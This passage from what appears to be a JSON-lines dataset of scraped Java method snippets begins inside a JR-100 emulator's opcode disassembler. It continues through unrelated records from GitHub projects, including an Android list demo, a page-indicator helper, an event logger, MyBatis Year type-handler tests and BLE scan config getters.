+ 1));                break;            case 0x8C:                inst = new CPX(a, Instruction.MODE_IMMEDIATE, getOperand2(i + 1));                break;            case 0x8D:                inst = new BSR(a, getOperand1(i + 1));                break;            case 0x8E:                inst = new LDS(a, Instruction.MODE_IMMEDIATE, getOperand2(i + 1));                break;            case 0x90:                inst = new SUBA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x91:                inst = new CMPA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x92:                inst = new SBCA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x94:                inst = new ANDA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x95:                inst = new BITA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x96:                inst = new LDAA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x97:                inst = new STAA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x98:                inst = new EORA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x99:                inst = new ADCA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x9A:                inst = new ORAA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x9B:                inst = new ADDA(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x9C:                inst = new CPX(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x9E:                inst = new LDS(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0x9F:                inst = new STS(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xA0:                inst = new SUBA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA1:                inst = new CMPA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA2:                inst = new SBCA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA4:                inst = new ANDA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA5:                inst = new BITA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA6:                inst = new LDAA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA7:                inst = new STAA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA8:                inst = new EORA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xA9:                inst = new ADCA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xAA:                inst = new ORAA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xAB:                inst = new ADDA(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xAC:                inst = new CPX(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xAD:                inst = new JSR(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xAE:                inst = new LDS(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xAF:                inst = new STS(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xB0:                inst = new SUBA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB1:                inst = new CMPA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB2:                inst = new SBCA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB4:                inst = new ANDA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB5:                inst = new BITA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB6:                inst = new LDAA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB7:                inst = new STAA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB8:                inst = new EORA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xB9:                inst = new ADCA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xBA:                inst = new ORAA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xBB:                inst = new ADDA(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xBC:                inst = new CPX(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xBD:                inst = new JSR(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xBE:                inst = new LDS(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xBF:                inst = new STS(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xC0:                inst = new SUBB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC1:                inst = new CMPB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC2:                inst = new SBCB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC4:                inst = new ANDB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC5:                inst = new BITB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC6:                inst = new LDAB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC8:                inst = new EORB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xC9:                inst = new ADCB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xCA:                inst = new ORAB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xCB:                inst = new ADDB(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xCE:                inst = new LDX(a, Instruction.MODE_IMMEDIATE, getOperand2(i + 1));                break;            case 0xD0:                inst = new SUBB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD1:                inst = new CMPB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD2:                inst = new SBCB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD4:                inst = new ANDB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD5:                inst = new BITB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD6:                inst = new LDAB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD7:                inst = new STAB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD8:                inst = new EORB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xD9:                inst = new ADCB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xDA:                inst = new ORAB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xDB:                inst = new ADDB(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xDE:                inst = new LDX(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xDF:                inst = new STX(a, Instruction.MODE_DIRECT, getOperand1(i + 1));                break;            case 0xE0:                inst = new SUBB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE1:                inst = new CMPB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE2:                inst = new SBCB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE4:                inst = new ANDB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE5:                inst = new BITB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE6:                inst = new LDAB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE7:                inst = new STAB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE8:                inst = new EORB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xE9:                inst = new ADCB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xEA:                inst = new ORAB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xEB:                inst = new ADDB(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xEC:                inst = new ADX(a, Instruction.MODE_IMMEDIATE, getOperand1(i + 1));                break;            case 0xEE:                inst = new LDX(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xEF:                inst = new STX(a, Instruction.MODE_INDEXED, getOperand1(i + 1));                break;            case 0xF0:                inst = new SUBB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF1:                inst = new CMPB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF2:                inst = new SBCB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF4:                inst = new ANDB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF5:                inst = new BITB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF6:                inst = new LDAB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF7:                inst = new STAB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF8:                inst = new EORB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xF9:                inst = new ADCB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xFA:                inst = new ORAB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xFB:                inst = new ADDB(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xFC:                inst = new ADX(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xFE:                inst = new LDX(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            case 0xFF:                inst = new STX(a, Instruction.MODE_EXTENDED, getOperand2(i + 1));                break;            default:                inst = new UnknownInstruction(a);                break;            }            instructions.add(inst);            i += inst.getLength();        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "resolveBranch", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveBranch() {        int label_number = 1;        for (Instruction i : instructions) {            if (i.isBranch()) {                int target_address;                BranchInstruction b = (BranchInstruction)i;                target_address = b.getTargetAddress();                for (Instruction j : instructions) {                    if (j.getAddress() == target_address) {                        if (!j.isBranchTarget()) {                            j.setBranchTarget();                            j.setLabel(new Label(label_number++));                        }                        b.setTarget(j);                    }                }            }        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sortLabel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sortLabel() {        Vector<Instruction> labels = new Vector<Instruction>();        for (Instruction i : instructions) {            if (i.getLabel() != null) {                labels.add(i);            }        }        Collections.sort(labels, new Comparator<Instruction>() {            public int compare(Instruction i1, Instruction i2) {                if (i1.getAddress() < i2.getAddress()) {                    return -1;                }                else if (i1.getAddress() > i2.getAddress()) {                    return 1;                }                else {                    return 0;                }            }        });        int labelNumber = 1;        for (Instruction i : labels) {            i.getLabel().setNumber(labelNumber++);        }    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "print", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String print() {        StringBuffer sb = new StringBuffer();        int index = 0;        for (Instruction i : instructions) {            if (i.getLabel() != null) {                sb.append(i.getLabel().toString() + \":\\n\");            }            sb.append(String.format(\"    %04x \", i.getAddress()));            for (int n = 0; n < 3; n++) {                if (n < i.getLength()) {                    sb.append(String.format(\"%02x \", data[index++]));                }                else {                    sb.append(\"   \");                }            }            sb.append(String.format(\"   %-5s %s\\n\", i.getMnemonic(), i.getOperandString()));        }        return sb.toString();    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "execute", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute() {        disassemble();        resolveBranch();        sortLabel();    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/assembler/Disassembler.java", "stars": "4", "class": {"name": "Disassembler", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_demo_listview);        initSource();        ListView list = (ListView) findViewById(R.id.list);        DemoListAdapter adapter = new DemoListAdapter(this, mSource);        list.setAdapter(adapter);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/PinItDemo/src/com/pinterest/samples/pinit/DemoListView.java", "stars": "74", "class": {"name": "DemoListView", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "initSource", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initSource() {        int w, h;        for (int i = 0; i < N; i++) {            // Generate w, h range from [1,5] and [1,4] respectively.            w = mRandom.nextInt(5) + 1;            h = mRandom.nextInt(4) + 1;            w *= 100;            h *= 100;            mSource.add(new Point(w, h));        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/PinItDemo/src/com/pinterest/samples/pinit/DemoListView.java", "stars": "74", "class": {"name": "DemoListView", "extends": "Activity", "implements": null, "modifiers": ["public"]}}, {"method_name": "evaluate", "params": ["Cursor"], "throws": null, "modifiers": ["private", "static"], "return_type": "Cursor", "snippet": "    private static Cursor evaluate(Cursor cursor) {        if (cursor != null) {            cursor.getCount();        }        return cursor;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/FeedProvider.java", "stars": "74", "class": {"name": "FeedProvider", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "createAnnotatedCursor", "params": ["Cursor", "Bundle"], "throws": null, "modifiers": ["private", "static"], "return_type": "AnnotatedCursor", "snippet": "    private static AnnotatedCursor createAnnotatedCursor(Cursor cursor, Bundle extras) {        if (cursor instanceof CrossProcessCursor) {            CrossProcessCursor crossProcessCursor = (CrossProcessCursor) cursor;            return new AnnotatedCrossProcessCursor(crossProcessCursor, extras);        } else if (cursor != null) {            return new AnnotatedCursor(cursor, extras);        } else {            return null;        }    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/FeedProvider.java", "stars": "74", "class": {"name": "FeedProvider", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "feedCursor", "params": ["Cursor", "Bundle"], "throws": null, "modifiers": ["public", "static"], "return_type": "Cursor", "snippet": "    public static Cursor feedCursor(Cursor cursor, Bundle extras) {        return createAnnotatedCursor(evaluate(cursor), extras);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/FeedProvider.java", "stars": "74", "class": {"name": "FeedProvider", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "errorCursor", "params": ["Cursor", "Bundle", "Throwable", "Intent"], "throws": null, "modifiers": ["public", "static"], "return_type": "Cursor", "snippet": "    public static Cursor errorCursor(Cursor cursor, Bundle extras, Throwable t, Intent solution) {        if (extras == null) {            throw new NullPointerException(\"Bundle is null\");        }        if (t == null) {            throw new NullPointerException(\"Throwable is null\");        }        extras.putSerializable(FeedExtras.EXTRA_ERROR, t);        if (solution != null) {            extras.putParcelable(FeedExtras.EXTRA_SOLUTION, solution);        }        return feedCursor(cursor, extras);    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/FeedProvider.java", "stars": "74", "class": {"name": "FeedProvider", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args)\t{\t\tScanner in = new Scanner(System.in);\t\t\t\t//get first input\t\tSystem.out.println(\"What is your name?\");\t\tString name = in.nextLine();\t\t\t\t//get second input\t\tSystem.out.println(\"How old are you?\");\t\tint age = in.nextInt();\t\t\t\t//display output on console\t\tSystem.out.println(\"Hello,\" + name + \".Next year,you'll be \" + (age + 1));\t}", "url": "https://raw.githubusercontent.com/hasaki-w-c/JAVA--/master/ray/Shuru.java", "stars": "2", "class": {"name": "Shuru", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getImitativePositionData", "params": ["List<PositionData>", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "PositionData", "snippet": "    public static PositionData getImitativePositionData(List<PositionData> positionDataList, int index) {        if (index >= 0 && index <= positionDataList.size() - 1) { // \u8d8a\u754c\u540e\uff0c\u8fd4\u56de\u5047\u7684PositionData            return positionDataList.get(index);        } else {            PositionData result = new PositionData();            PositionData referenceData;            int offset;            if (index < 0) {                offset = index;                referenceData = positionDataList.get(0);            } else {                offset = index - positionDataList.size() + 1;                referenceData = positionDataList.get(positionDataList.size() - 1);            }            result.mLeft = referenceData.mLeft + offset * referenceData.width();            result.mTop = referenceData.mTop;            result.mRight = referenceData.mRight + offset * referenceData.width();            result.mBottom = referenceData.mBottom;            result.mContentLeft = referenceData.mContentLeft + offset * referenceData.width();            result.mContentTop = referenceData.mContentTop;            result.mContentRight = referenceData.mContentRight + offset * referenceData.width();            result.mContentBottom = referenceData.mContentBottom;            return result;        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handlePageSelected", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handlePageSelected(int selectedIndex) {        handlePageSelected(selectedIndex, true);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "handlePageSelected", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void handlePageSelected(int selectedIndex, boolean smooth) {        if (mLastSelectedIndex == selectedIndex) {            return;        }        if (smooth) {            if (mScrollAnimator == null || !mScrollAnimator.isRunning()) {                dispatchPageScrollStateChanged(ScrollState.SCROLL_STATE_SETTLING);            }            dispatchPageSelected(selectedIndex);            float currentPositionOffsetSum = mLastSelectedIndex;            if (mScrollAnimator != null) {                currentPositionOffsetSum = (Float) mScrollAnimator.getAnimatedValue();                mScrollAnimator.cancel();                mScrollAnimator = null;            }            mScrollAnimator = new ValueAnimator();            mScrollAnimator.setFloatValues(currentPositionOffsetSum, selectedIndex);    // position = selectedIndex, positionOffset = 0.0f            mScrollAnimator.addUpdateListener(mAnimatorUpdateListener);            mScrollAnimator.addListener(mAnimatorListener);            mScrollAnimator.setInterpolator(mInterpolator);            mScrollAnimator.setDuration(mDuration);            mScrollAnimator.start();        } else {            dispatchPageSelected(selectedIndex);            if (mScrollAnimator != null && mScrollAnimator.isRunning()) {                dispatchPageScrolled(mLastSelectedIndex, 0.0f, 0);            }            dispatchPageScrollStateChanged(ScrollState.SCROLL_STATE_IDLE);            dispatchPageScrolled(selectedIndex, 0.0f, 0);        }        mLastSelectedIndex = selectedIndex;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDuration", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDuration(int duration) {        mDuration = duration;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setInterpolator", "params": ["Interpolator"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setInterpolator(Interpolator interpolator) {        if (interpolator == null) {            mInterpolator = new AccelerateDecelerateInterpolator();        } else {            mInterpolator = interpolator;        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "attachMagicIndicator", "params": ["MagicIndicator"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void attachMagicIndicator(MagicIndicator magicIndicator) {        mMagicIndicators.add(magicIndicator);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dispatchPageSelected", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void dispatchPageSelected(int pageIndex) {        for (MagicIndicator magicIndicator : mMagicIndicators) {            magicIndicator.onPageSelected(pageIndex);        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dispatchPageScrollStateChanged", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void dispatchPageScrollStateChanged(int state) {        for (MagicIndicator magicIndicator : mMagicIndicators) {            magicIndicator.onPageScrollStateChanged(state);        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "dispatchPageScrolled", "params": ["int", "float", "int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void dispatchPageScrolled(int position, float positionOffset, int positionOffsetPixels) {        for (MagicIndicator magicIndicator : mMagicIndicators) {            magicIndicator.onPageScrolled(position, positionOffset, positionOffsetPixels);        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/FragmentContainerHelper.java", "stars": "1", "class": {"name": "FragmentContainerHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onProductEvent", "params": ["ProductEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onProductEvent(ProductEvent event) {        final String time = sdf.format(new Date(event.getTime()));        writeString(time + \" \" + event.getSource().toString());    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/event/EventLogger.java", "stars": "2", "class": {"name": "EventLogger", "extends": null, "implements": ["IProductListener"], "modifiers": ["public"]}}, {"method_name": "writeString", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeString(String string) {        try {            bufferedWriter.write(string + \"\\n\");            bufferedWriter.flush();        } catch (IOException e) {            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/event/EventLogger.java", "stars": "2", "class": {"name": "EventLogger", "extends": null, "implements": ["IProductListener"], "modifiers": ["public"]}}, {"method_name": "getLogFileName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLogFileName() {        return logFileName;    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Lab7/src/main/java/com/demkom58/lab7/event/EventLogger.java", "stars": "2", "class": {"name": "EventLogger", "extends": null, "implements": ["IProductListener"], "modifiers": ["public"]}}, {"method_name": "shouldSetParameter", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldSetParameter() throws Exception {    TYPE_HANDLER.setParameter(ps, 1, INSTANT, null);    verify(ps).setInt(1, INSTANT.getValue());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByName() throws Exception {    when(rs.getInt(\"column\")).thenReturn(INSTANT.getValue());    assertEquals(INSTANT, TYPE_HANDLER.getResult(rs, \"column\"));    when(rs.getInt(\"column\")).thenReturn(0);    assertEquals(Year.of(0), TYPE_HANDLER.getResult(rs, \"column\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByName", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByName() throws Exception {    when(rs.getInt(\"column\")).thenReturn(0);    when(rs.wasNull()).thenReturn(true);    assertNull(TYPE_HANDLER.getResult(rs, \"column\"));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromResultSetByPosition() throws Exception {    when(rs.getInt(1)).thenReturn(INSTANT.getValue());    assertEquals(INSTANT, TYPE_HANDLER.getResult(rs, 1));    when(rs.getInt(1)).thenReturn(0);    assertEquals(Year.of(0), TYPE_HANDLER.getResult(rs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromResultSetByPosition", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromResultSetByPosition() throws Exception {    when(rs.getInt(1)).thenReturn(0);    when(rs.wasNull()).thenReturn(true);    assertNull(TYPE_HANDLER.getResult(rs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultFromCallableStatement() throws Exception {    when(cs.getInt(1)).thenReturn(INSTANT.getValue());    assertEquals(INSTANT, TYPE_HANDLER.getResult(cs, 1));    when(cs.getInt(1)).thenReturn(0);    assertEquals(Year.of(0), TYPE_HANDLER.getResult(cs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "shouldGetResultNullFromCallableStatement", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shouldGetResultNullFromCallableStatement() throws Exception {    when(cs.getInt(1)).thenReturn(0);    when(cs.wasNull()).thenReturn(true);    assertNull(TYPE_HANDLER.getResult(cs, 1));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/type/YearTypeHandlerTest.java", "stars": "15", "class": {"name": "YearTypeHandlerTest", "extends": "BaseTypeHandlerTest", "implements": null, "modifiers": []}}, {"method_name": "getServiceUuids", "params": [], "throws": null, "modifiers": ["public"], "return_type": "UUID", "snippet": "    public UUID[] getServiceUuids() {        return mServiceUuids;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "BleScanRuleConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDeviceNames", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String[] getDeviceNames() {        return mDeviceNames;    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/scan/BleScanRuleConfig.java", "stars": "2", "class": {"name": "BleScanRuleConfig", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDeviceMac", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDeviceMac() {        return 